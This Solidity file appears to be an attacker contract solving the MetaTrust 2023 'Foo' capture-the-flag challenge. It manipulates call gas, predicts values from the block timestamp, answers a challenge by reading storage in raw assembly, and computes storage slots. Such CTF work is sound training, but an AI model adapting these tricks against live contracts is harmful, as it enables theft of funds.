// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
import "./Foo.sol";
import "hardhat/console.sol";

contract FooAttackMetaTrust23 {
    uint256 data1;
    uint256 data2;
    uint256 data3;
    uint256 data4;
    uint256 data5;
    uint256 data6;
    uint256 data7;
    uint256 data8;
    FooMetaTrust23 f;
    bytes4 selector = bytes4(keccak256(bytes('stage2()')));
    uint[] public challenge = new uint[](8);
    
    
    function setup(address target) public {
        f = FooMetaTrust23(target);
        f.setup();
    }

    function stage1() public {
        f.stage1();
    }

    function stage2(uint _gas) public {
        (bool success, ) = address(f).call{gas:_gas}(abi.encodePacked(selector));
        require(success, "call failed");
    }

    function stage3() public {
        challenge[0] = (block.timestamp & 0xf0000000) >> 28;
        challenge[1] = (block.timestamp & 0xf000000) >> 24;
        challenge[2] = (block.timestamp & 0xf00000) >> 20;
        challenge[3] = (block.timestamp & 0xf0000) >> 16;
        challenge[4] = (block.timestamp & 0xf000) >> 12;
        challenge[5] = (block.timestamp & 0xf00) >> 8;
        challenge[6] = (block.timestamp & 0xf0) >> 4;
        challenge[7] = (block.timestamp & 0xf) >> 0;
        for(uint i=0 ; i<8 ; i++) {
            for(uint j=i+1 ; j<8 ; j++) {
                if (challenge[i] > challenge[j]) {
                    uint tmp = challenge[i];
                    challenge[i] = challenge[j];
                    challenge[j] = tmp;
                }
            }
        }
        data1 = challenge[0];
        data2 = challenge[1];
        data3 = challenge[2];
        data4 = challenge[3];
        data5 = challenge[4];
        data6 = challenge[5];
        data7 = challenge[6];
        data8 = challenge[7];
        f.stage3();
    }

    function stage4() public {
        f.stage4();
    }


    function check() view public returns(bytes32 result) {
        if (gasleft() > 230000) {
            uint i = 0;
            while(i<100) {
                i += 1;
            }
            return keccak256(abi.encodePacked("1337"));
        } else {
            return keccak256(abi.encodePacked("13337"));
        }
    }
    
    function sort(uint256[] memory) view public{
        assembly {
            mstore(0, 0x20)          // offset
            mstore(0x20, 8)          // length
            let num := sload(0)
            mstore(0x40, num)        // challenge[0]
            num := sload(1)
            mstore(0x60, num)
            num := sload(2)
            mstore(0x80, num)
            num := sload(3)
            mstore(0xa0, num)
            num := sload(4)
            mstore(0xc0, num)
            num := sload(5)
            mstore(0xe0, num)
            num := sload(6)
            mstore(0x100, num)
            num := sload(7)
            mstore(0x120, num)
            return(0, 0x140)
        }
    }

    function pos() public view returns(bytes32 p){
        uint slot = 1;
        uint index = 4;
        uint addr = uint160(address(this));
        p = keccak256(abi.encode(addr, keccak256(abi.encode(index, slot))));
        return p;
    }
}